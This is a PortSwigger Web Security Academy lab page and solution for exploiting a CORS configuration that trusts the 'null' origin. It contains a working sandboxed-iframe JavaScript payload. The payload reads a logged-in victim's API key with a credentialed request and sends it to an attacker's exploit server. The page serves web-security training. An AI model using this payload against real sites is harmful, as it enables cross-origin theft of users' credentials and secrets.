# Lab: CORS vulnerability with trusted null origin

Source: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
Fetched: 2026-06-28T09:17:43.343110+00:00

Web Security Academy

CORS

Lab

Lab: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Solution

Check intercept is off, then use Burp's browser to log in to your account. Click "My account".

Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

Send the request to Burp Repeater, and resubmit it with the added header Origin: null.

Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID:

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>

var req = new XMLHttpRequest();

req.onload = reqListener;

req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

req.withCredentials = true;

req.send();

function reqListener() {

location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);

};

</script>"></iframe>

Notice the use of an iframe sandbox as this generates a null origin request.

Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.

Go back to the exploit server and click "Deliver exploit to victim".

Click "Access log", retrieve and submit the victim's API key to complete the lab.

Community solutions

Rana Khalil

Popo Hack

Find CORS vulnerabilities using Burp Suite

Try for free
